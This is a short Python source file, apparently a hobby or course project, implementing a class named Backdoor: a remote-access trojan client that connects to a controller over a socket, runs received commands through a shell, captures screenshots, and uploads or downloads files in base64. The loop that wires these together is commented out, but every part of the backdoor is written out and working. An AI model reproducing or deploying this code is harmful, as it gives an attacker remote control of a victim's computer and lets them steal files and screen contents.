import socket, json, subprocess, os, base64
from PIL import ImageGrab


class Backdoor:
    DISCONNECT = '!DISCONNECT'

    def __init__(self, server, port):
        self.server = server
        self.port = port
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        self.connection.connect((self.server, int(self.port)))

    def sender(self, message):
        message = json.dumps(message).encode()
        self.connection.send(message)

    def read_file(self, name):
        with open(name, 'rb') as fil:
            return base64.b64encode(fil.read()).decode()

    def write_file(self, content, name):
        content = base64.b64decode(content)
        # print(content)
        # print(name)
        with open(name, 'wb') as fil:
            fil.write(content)
        return 'UPLOADED'

    def receiver(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1020).decode()
                return json.loads(json_data)
            except ValueError:
                pass

    def run_command(self, command):
        split_commnad = command.split()
        try:
            if split_commnad[0] == 'cd': # CHANGING DIR
                os.chdir(split_commnad[1])
                result = os.getcwd()
            elif command == 'screenshot':
                image = ImageGrab.grab()
                image.save('screen.png')
                result = self.read_file('screen.png')
                os.remove('screen.png')
            elif split_commnad[0] == 'upload':
                # print(split_commnad)
                name = split_commnad[1]
                content = split_commnad[2]
                result = self.write_file(content=content, name=name)
            elif split_commnad[0] == 'download':
                result = self.read_file(split_commnad[1])
            else:
                result = subprocess.check_output(command,
                                        shell=True).decode()
        except IndexError:
            result = 'SOME ERROR OCCURED'
            # pass
        return result


    # def start(self):
        # while True:
        #     message = self.receiver()
        #     result = self.run_command(message)
        #     self.sender(result)


# b = Backdoor('127.0.0.1', 5050)
# b.connect()
# b.start()
